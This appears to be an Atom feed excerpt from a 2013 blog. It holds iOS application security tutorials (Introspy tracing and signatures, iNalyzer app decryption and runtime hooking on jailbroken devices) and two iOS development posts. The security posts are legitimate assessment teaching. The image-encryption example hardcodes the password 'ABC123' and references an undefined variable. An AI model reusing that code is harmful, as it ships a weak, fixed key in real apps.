&lt;p&gt;In this article, we looked at how we can import the introspy module in our own python scripts and fetch different kinds of information like signatures, tracedCalls etc from a generated database file and present them in whichever way we want. This could be used in preparing our own custom reports for the analysis of a particular iOS application. This information can also be fed into other python scripts that can be able to perform further tasks like runtime manipulation etc.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Introspy&lt;br /&gt;
&lt;a href=&quot;https://github.com/iSECPartners/introspy&quot;&gt;https://github.com/iSECPartners/introspy&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>IOS Dev - Encrypting images and saving them in App Sandbox</title>
   <link href="https://bitbrain.github.io/2013/09/26/ios-dev-encrypted-images-and-saving-them-in-app-sandbox.html"/>
   <updated>2013-09-26T17:41:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/09/26/ios-dev-encrypted-images-and-saving-them-in-app-sandbox</id>
   <content type="html">&lt;p&gt;One of the requirements in my latest project was to encrypt an image and save it on the device in the application’s sandbox, then decrypt is during runtime and upload it to the server. I looked at the documentation for Apple’s CommonCrypto Framework, but it was taking me plenty of time to implement it so instead i decided to use some wrappers that would get the job done for me. I found the &lt;a href=&quot;https://github.com/rnapier/RNCryptor&quot;&gt;RNCryptor&lt;/a&gt; library on Github that uses AES encrypton. It was pretty simple to implement it. First, download the files from its github url and include all the files that are relevant to you present inside the &lt;strong&gt;RNCryptor&lt;/strong&gt; folder on your project. In my case, i just imported all of them for now. &lt;img src=&quot;/images/posts/imageen/1.png&quot; alt=&quot;1&quot; /&gt; Then use the following code to encrypt the image.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;pre&gt;//  Code for encrypting and saveing image 
    UIImage *imageToEncrypt = [UIImage imageNamed:@&quot;SomeImage&quot;];
    NSString  *imagePath = [NSHomeDirectory() stringByAppendingPathComponent:@&quot;Documents/encryptedImage.png&quot;];

    NSData *data = UIImagePNGRepresentation(fetchedImage);
    NSError *error;
    NSData *encryptedData = [RNEncryptor encryptData:data
                                        withSettings:kRNCryptorAES256Settings
                                            password:@&quot;ABC123&quot;
                                               error:&amp;amp;error];
   [encryptedData writeToFile:imagePath atomically:YES];
&lt;/pre&gt;

&lt;p&gt;Note that encryting and decrypting the image requires a passcode (ABC123). To decrypt the image, use the following code ..&lt;/p&gt;

&lt;pre&gt; //  Code for loading image by decryption
    NSString  *imagePath = [NSHomeDirectory() stringByAppendingPathComponent:@&quot;Documents/encryptedImage.png&quot;];
    NSData *encryptedData = [NSData dataWithContentsOfFile:imagePath];
    NSData *decryptedData = [RNDecryptor decryptData:encryptedData
                                        withPassword:@&quot;ABC123&quot;
                                               error:&amp;amp;error];
    UIImage *image = [UIImage imageWithData:decryptedData];
&lt;/pre&gt;

&lt;p&gt;See, its pretty simple. If you have any questions, let me know in the comments secton below and i will get back to you.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 18 – Detecting custom signatures with Introspy</title>
   <link href="https://bitbrain.github.io/2013/09/26/ios-application-security-part-18-detecting-custom-signatures-with-introspy.html"/>
   <updated>2013-09-26T17:18:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/09/26/ios-application-security-part-18-detecting-custom-signatures-with-introspy</id>
   <content type="html">&lt;p&gt;In the previous article, we looked at how we can use Introspy for Black-box assessment of iOS applications. In this article, we will look at how we can use Introspy to set up our own custom signatures and detect them in an application trace. Setting up our own predefined signatures could be useful for cases where you have a found a method in a particular application that seems of particular interest to you and you want to know when it is being called. Introspy already has a list of predefined signatures that it uses to flag vulnerabilities or insecure configurations. However, it also allows us to add our own signatures.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;You can find the predefined signatures in Introspy in the signatures.py file inside the analyzer folder.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios18/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From here, we can see that a signatures consists of a title, description, a severity level and a filter which consists of the method calls that correspond to the signature. So let’s look at a sample signature.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios18/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Over here, you can see a signature that checks whether the application uses Pasteboards or not. Pasteboards are generally very insecure as they can allow an application to copy some data from the Pasteboard into their application. Hence this signature makes sense. You can see that the filter consists of two values, &lt;em&gt;classes_to_match&lt;/em&gt; and &lt;em&gt;methods_to_match&lt;/em&gt;. You can also specify a parameter &lt;em&gt;args_to_match&lt;/em&gt; in your signature. So from this signature, it is pretty much clear that these following method implementations will match the above signature.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;UIPasteboard *pasteboard = [UIPasteboard generalPasteboard];&lt;/li&gt;
  &lt;li&gt;UIPasteboard *pasteboard = [UIPasteboard pasteboardWithName:@”XYZ” create:YES];&lt;/li&gt;
  &lt;li&gt;UIPasteboard *pasteboard = [UIPasteboard pasteboardWithUniqueName];&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Another signature shown in the image below checks for methods that bypass credential validation while connecting to a remote server. This happens in cases where you are using a self singed SSL certificate and would like to trust it everytime without any kind of validation.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios18/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For any LibC signature, just set the &lt;em&gt;classes_to_match&lt;/em&gt; attribute as &lt;em&gt;C&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios18/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now lets understand a signature that has some arguments also with it as a filter. The filter can be defined using 3 classes which can be found in the file Filters.py. These classes are &lt;em&gt;ArgumentsFilter&lt;/em&gt;, &lt;em&gt;ArgumentsNotSetFilter&lt;/em&gt; or &lt;em&gt;ArgumentsWithMaskFilter&lt;/em&gt;. Here are some screenshots from the code itself that define the purpose of these classes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios18/8.png&quot; alt=&quot;8&quot; /&gt; &lt;img src=&quot;/images/posts/ios18/9.png&quot; alt=&quot;9&quot; /&gt; &lt;img src=&quot;/images/posts/ios18/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here is a signature written in the Signatures.py file that detects the scenario when some data is written to the keychain without a secure protection domain (pdmn). As you can see, both the &lt;em&gt;ArgumentsFilter&lt;/em&gt; and &lt;em&gt;ArgumentsNotSetFilter&lt;/em&gt; filters have been used to detect signaturres. The &lt;em&gt;ArgumentsFilter&lt;/em&gt; signature is used to find pdmn’s that are insecure whereas &lt;em&gt;ArgumentsNotSetFilter&lt;/em&gt; is used to find cases where no accessibility option is provided and hence defaults to kSecAttrAccessibleAlways.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios18/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now lets add a custom signature to the signature.py file. In this case, we are checking for the case whenever someone gets a string saved in NSUserDefaults.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios18/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now run the python script introspy.py file on the saved database file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios18/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the report under Potential Findings, you will see that our signature was identified in many different places.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios18/7.png&quot; alt=&quot;7&quot; /&gt; &lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In this article, we looked at how we can use Introspy to set up our own custom signatures and detect them in an application. Using these custom signatures when performing static analysis of these applications can be very useful if you are looking to track some specific method implementations.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Introspy&lt;br /&gt;
&lt;a href=&quot;https://github.com/iSECPartners/introspy&quot;&gt;https://github.com/iSECPartners/introspy&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 17 – Black-Box Assessment of iOS Applications using INTROSPY</title>
   <link href="https://bitbrain.github.io/2013/09/23/ios-application-security-part-17-black-box-assessment-of-ios-applications-using-introspy.html"/>
   <updated>2013-09-23T13:21:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/09/23/ios-application-security-part-17-black-box-assessment-of-ios-applications-using-introspy</id>
   <content type="html">&lt;p&gt;In this article, we will look at how we can use Introspy for Black-box assessment of iOS applications. Introspy is developed by &lt;a href=&quot;https://www.isecpartners.com/&quot;&gt;ISEC partners&lt;/a&gt; and its github page can be found &lt;a href=&quot;https://github.com/iSECPartners/introspy&quot;&gt;here&lt;/a&gt;. Introspy consists of two seperate modules, a tracer and an analyzer. It is undoubtedly one of the most powerful tools for analyzing the security of iOS applications.&lt;/p&gt;

&lt;p&gt;The first step is to install the Introspy tracer on your device. You can download the debian package from &lt;a href=&quot;https://www.dropbox.com/s/z5cwqk5wti3zsvd/com.isecpartners.introspy-v0.3-iOS_6.1.deb?dl=1&quot;&gt;here&lt;/a&gt;. Once it is downloaded, just upload it and install on your device. The image below shows how to perform all the above mentioned steps.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios17/1.png&quot; alt=&quot;1&quot; /&gt; &lt;img src=&quot;/images/posts/ios17/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the tracer has been installed on your device, reboot or respring it. Go to Settings app and you will now see a different section for Introspy.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios17/3.PNG&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Introspy Apps section lets you choose the apps that you want to perform your analysis on. So go over to it and select the app that you want to analyze. In my case, i will select the Path app for analysis.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios17/4.PNG&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now go over to the Introspy settings option and make sure every option is selected, specially the option &lt;em&gt;Log to The Console&lt;/em&gt;. If we check this option, the Introspy analyzer will log all the information that it finds about the app to the device console which allows us to see the information being logged during runtime.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios17/5.PNG&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the Path app has been selected, make sure it is not running. If it is running, quit it and restart the app again. Also make sure that your device is connected to your computer as we want to see the device logs that the Introspy analyzer will be logging. Also, open Xcode on your machine (if you are on a Mac), go to Window -&amp;gt; Organizer -&amp;gt; Devices. Choose your device from the menu on the left and select Console. You will now be able to see the device logs.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios17/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now start the Path app and try to browse the app as much as possible. In the meantime, the analyzer will work in the background and collect as much information about the app as possible. You can see that it is logging info on the device as well. In this case, we can see a request being made to the server and we can see all the contents of the request, including the path and the query parameter.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios17/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And over here, you can see that the app is checking the NSUserDefaults for the userId key. This information should have been stored in the keychain instead.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios17/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But probably the most interesting piece of information can be found from the image below. As you can see, the app is checking NSUserDefaults for a bool value &lt;em&gt;HangTracerEnabled&lt;/em&gt;. This could have been a check to see if the the app is being traced during runtime and if so, quit the app. However, this technique seems to fail currently as it not able to detect the Introspy analyzer. But when i ran Snoop-it to analyze the Path application, it crashed. So this bool value definitely seems to be a check to determine whether tracing is being enabled or not. We will look up this concept in later articles.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios17/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Apart from displaying the runtime information about the app in the Console, Introspy also saves it in a sqlite database file on your device. From your computer, you can fetch this database file and Introspy will convert it into a well presentable format. To fetch the database files from your device, first of all download &lt;a href=&quot;https://github.com/iSECPartners/introspy/archive/master.zip&quot;&gt;Introspy&lt;/a&gt; from its github page. Then navigate inside the Analyzer folder and use the command as shown in the figure below. You will need to specify the directory in which the report will be put on your local machine as well as the ip address of your device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios17/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, Introspy will ask you to select a database file. These database files are created for each application that we had selected from the Settings. In this case, lets select the database for the Path App.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios17/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You will see that the database file had been saved in the present directory as well as a folder with the name Path-Report had been created. If we go inside that folder and open up the file report.html, this is what we see. As you can see, Introspy has displayed the complete information in a much more presentable format. We can see the list of traced calls along with the arguments that were passed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios17/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can also see a list of potential findings. These are basically the vulnerabilities that Introspy thinks it has found out. In this case, we can see some Insecure Data Storage issues. Its not necessarily a vulnerability though as the information that was written may not have been of much importance.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios17/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can also customise the information that you want to see by selecting the options as shown in the image below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios17/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For example, i have configured it to just show me the methods related to UserPreferences. This information can be very helpful as it can help us find some important information that may have been written to NSUserDefaults. Even though it is not shown in the image below, but i was easily able to figure out that Path was saving my userId in NSUserDefaults and using it in a lot of other places. This information should have been stored in a more secure place, for e.g the keychain.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios17/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can also analyze the saved database file directly from the command line. Here is the usage information.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios17/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s use the info command on http. As you can see, it dumps a list of the endpoints.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios17/17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Introspy can also be imported as a module and used in other Python scripts. We can also add our own signatures to flag vulnerabilities or insecure configurations. We will look into those concepts in later articles.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In this article, we looked at how we can use Introspy to perform black-box assessment of iOS applications. Introspy consists of 2 modules, the Tracer and the Analyzer. We can use the Tracer to perform runtime analysis of the application. The tracer can then store the results in a sqlite file which can be later used by the analyzer for analysis, or it can also just log all the data to the device console. The Analyzer can also generate a well detailed HTML report from the database file.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Introspy&lt;br /&gt;
&lt;a href=&quot;https://github.com/iSECPartners/introspy&quot;&gt;https://github.com/iSECPartners/introspy&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>IOS Dev - Storing Info in Keychain with NSUserDefaults like syntax</title>
   <link href="https://bitbrain.github.io/2013/09/17/ios-dev-storing-info-in-keychain-with-nsuserdefaults-like-syntax.html"/>
   <updated>2013-09-17T17:55:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/09/17/ios-dev-storing-info-in-keychain-with-nsuserdefaults-like-syntax</id>
   <content type="html">&lt;p&gt;Recently, i decided to improve the security of one of my applications by storing some of the information that i was previously saving in NSUserDefaults in the Keychain. Basically, this doesn’t make that much of a difference if your device is jailbroken. However, if your device is not jailbroken then it is possible to fetch the information saved by NSUserDefaults but not from the Keychain. This is because NSUserDefaults saves the information in an unencrypted format in a plist file inside the application sandbox which can be easily fetched. It can also be fetched from an iTunes backup. Hence, saving info in the Keychain adds an extra layer of security in that case. I started looking for some Keychain Wrappers and bumped into this amazing library from Github named &lt;a href=&quot;https://github.com/carlbrown/PDKeychainBindingsController&quot;&gt;PDKeychainBindingsController&lt;/a&gt;. I found it ridiculously simple to use. First i added the relevant files to my project. &lt;img src=&quot;/images/posts/keychain/1.png&quot; alt=&quot;1&quot; /&gt; Then i imported &lt;strong&gt;PDKeychainBindings.h&lt;/strong&gt; in whichever file i wanted to use it and changed the implementation from NSUserDefaults which was like this…&lt;/p&gt;

&lt;!-- more --&gt;

&lt;pre&gt; NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
 [[Model sharedModel] currentUser] setAuthToken:[defaults objectForKey:@&quot;authToken&quot;]];
&lt;/pre&gt;

&lt;p&gt;to this…&lt;/p&gt;

&lt;pre&gt;PDKeychainBindings *bindings = [PDKeychainBindings sharedKeychainBindings];
[[[Model sharedModel] currentUser] setAuthToken:[bindings objectForKey:@&quot;authToken&quot;]];
&lt;/pre&gt;

&lt;p&gt;To save objects in the keychain, use this ..&lt;/p&gt;

&lt;pre&gt;PDKeychainBindings *bindings = [PDKeychainBindings sharedKeychainBindings];
[bindings setObject:@&quot;XYZ&quot; forKey:@&quot;authToken&quot;];
&lt;/pre&gt;

&lt;p&gt;As Simple as that ! I would recommend this library to anyone who wants to save information in their keychain because of its ease of use. If you still face any issues, write down a comment and i will get back to you :-)&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 16 – Runtime Analysis of iOS Applications using iNalyzer</title>
   <link href="https://bitbrain.github.io/2013/09/17/ios-application-security-part-16-runtime-analysis-of-ios-applications-using-inalyzer.html"/>
   <updated>2013-09-17T13:12:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/09/17/ios-application-security-part-16-runtime-analysis-of-ios-applications-using-inalyzer</id>
   <content type="html">&lt;p&gt;In the previous article, we looked at how we can perform static analysis of iOS Applications using iNalyzer. In this article, we will look at how we can use iNalyzer to perform runtime analysis of iOS applications. We can invoke methods during runtime, find the value of a particular instance variable at a particular time in the app, and basically do anything that we can do with Cycript.&lt;/p&gt;

&lt;p&gt;In the last article, we were successfully able to generate the html files via Doxygen and open it up to view class information and other information about the app. For runtime analysis, we will be using the Firefox browser. The developer of this tool has personally recommended me to use Firefox as this may not work on other browsers. However, it seemed to be working fine for me on Chrome as well.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;&lt;strong&gt;To open up the runtime interpreter, first of all open up the index.html file generated by Doxygen for the app that you want to analyze, then just double tap the left arrow key.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios16/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You will see a console come up on the top as shown in the figure above where we can type commands. The first thing to do is to tell iNalyzer the ip address of your device, which in this case is 10.0.1.23. So let me just enter that on the box in the middle and press enter.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios16/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the IP address has been set, make sure that the app that you want to analyze is open (i.e on foreground) on your device and your device is not in sleep mode. This is important because if your app is in the background or the device is in sleep mode, then your app is temporarily paused by the operating system and hence it is not possible to perform any kind of runtime analysis on the app.&lt;/p&gt;

&lt;p&gt;Once the app is open, just type any command on the console, just like you would type on Cycript.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios16/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, we get a response. We can now type any cycript command that we want here.&lt;/p&gt;

&lt;p&gt;Let’s hide the status bar from the app. We can do this with the command [[UIApplication sharedApplication] setStatusBarHidden:YES animated:YES];&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios16/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We see that we don’t get a response. Its because the response type of this method is void.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios16/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, the status bar has been hidden in the app. Note that we no longer see the time on the top.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios16/6.PNG&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Similarly, we can also find the delegate class of this app.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios16/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can also set the application icon badge number. In this case, let us set it to 9000.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios16/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And it works.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios16/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since this is exactly similar as having a cycript console, we can enter javascript code as well or any other command from Cycript’s documentation. Here is a command i entered from the &lt;a href=&quot;http://iphonedevwiki.net/index.php/Cycript_Tricks&quot;&gt;Cycript tricks&lt;/a&gt; page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios16/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Similarly, i can create a function using both Objective-C and javascript syntax. If you are not following cycript here, please refer to the earlier parts on this series that talk about Cycript and its usage in detail.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios16/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I can then use that method whenever i like.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios16/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In part 9 on this series, we had discussed about an application named Snoop-it. iNalyzer is very similar to Snoop-it. However both have their advantages and disadvantages. At the time of writing of the article on Snoop-it, it didn’t allow for method swizzling, whereas iNalyzer does. Similarly, iNalyzer doesn’t allow us to monitor api calls whereas Snoop-it does have that feature. Hence, both these applications have their pros and cons.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In this article, we looked at looked at how we can leverage the power of iNalyzer to perform runtime analysis of iOS applications. iNalyzer is a great tool in the arsenal for anyone interested in learning iOS application security as it makes our task much more easier and efficient.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;iNalyzer&lt;br /&gt;
&lt;a href=&quot;https://appsec-labs.com/iNalyzer&quot;&gt;https://appsec-labs.com/iNalyzer&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 15 – Static Analysis of iOS Applications using iNalyzer</title>
   <link href="https://bitbrain.github.io/2013/09/17/ios-application-security-part-15-static-analysis-of-ios-applications-using-inalyzer.html"/>
   <updated>2013-09-17T13:11:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/09/17/ios-application-security-part-15-static-analysis-of-ios-applications-using-inalyzer</id>
   <content type="html">&lt;p&gt;In the previous article, we looked at how we can use Sogeti Data protection tools to boot an iDevice using a custom ramdisk with the help of a bootrom exploit. In this article, we will look at a tool named iNalyzer than we can use for black box assessment of iOS applications. iNalyzer allows us to view the class information, perform runtime analysis and many other things. Basically it automates the efforts of decrypting the application, dumping class information and presents it in a much more presentable way. We can also hook into a running process just like Cycript and invoke methods during runtime. iNalyzer is developed and maintained by &lt;a href=&quot;https://appsec-labs.com&quot;&gt;AppSec Labs&lt;/a&gt; and its offical page can be found &lt;a href=&quot;https://appsec-labs.com/iNalyzer&quot;&gt;here&lt;/a&gt;. iNalyzer is also made available open source and its github page can be found &lt;a href=&quot;https://github.com/appsec-labs/iNalyzer&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;iNalyzer require some dependencies to be installed before use. Please make sure to install &lt;a href=&quot;http://www.graphviz.org/download..php&quot;&gt;Graphviz&lt;/a&gt; and &lt;a href=&quot;http://www.stack.nl/~dimitri/doxygen/download.html#srcbin&quot;&gt;Doxygen&lt;/a&gt; as iNalyzer won’t function without these. Also, please note that while performing my tests on a Mac OS X Mountain Lion 10.8.4, i had problems with the latest version of Graphviz and it used to hang every time. Hence i downloaded an older version of Graphviz (v 2.30.1) and it worked fine for me. You can find older versions of Graphviz for Mac OS &lt;a href=&quot;http://www.graphviz.org/pub/graphviz/stable/macos/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The first step is to install iNalyzer on your jailbroken iDevice. To do that, go to Cydia –&amp;gt; Manage and make sure the source http://appsec-labs.com/cydia/ is added as shown in the image below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/1.PNG&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then go to Search and search for &lt;em&gt;iNalyzer&lt;/em&gt;. Depending on the iOS version that you are running, you should download the corresponding version of iNalyzer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/2.PNG&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, i have already installed iNalyzer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/3.PNG&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now ssh into the device and navigate inside the iNalyzer application directory. iNalyzer is installed in the &lt;em&gt;/Applications&lt;/em&gt; directory because it needs to run as a root user. If you don’t understand this concept, please make sure to read the previous articles in this series.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Run ./iNalyzer to start iNalyzer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now if you go to your homescreen and look at the iNalyzer app icon, you will see a badge icon number on top of it. This indicates that the app can be remotely accessed via a web interface and the port number is the badge icon number represented here. If you run ./iNalyzer again, it will stop iNalyzer. Hence, make sure to remember that running ./iNalyzer starts and closes the application alternatively.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now find the ip address of your iDevice and open the url ip:port from your browser. In my case the port number is 5544 and the ip address of the device is 10.0.1.23 . Hence the url is http://10.0.1.23:5544/ . Once you go there, you will be presented with an interface as shown in the figure below. You can then select an application and iNalyzer will prepare a zip file and download it on your system for analysis.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, i had some problems while performing this. Hence, we will also be looking at an alternative solution to do the same step. To do that, first of all make sure iNalyzer is running. Then navigate inside the iNalyzer directory and run &lt;em&gt;iNalyzer5&lt;/em&gt; without any arguments.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You will see all the list of apps available for analysis. In this case, let’s select the Defcon App for analysis.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You will see that iNalyzer begins its work. It decrypts the app, finds out the class information and other things. As you can see from the figure below, once iNalyzer has finished its job, it will create an ipa file and store it at the location as highlighted in the image below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So now we need to get this ipa file and download it on our system. We can do that via sftp.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once we have the ipa file, change its extension to zip. Then unzip the file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now with a terminal, navigate inside the folder Payload–&amp;gt;Doxygen.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

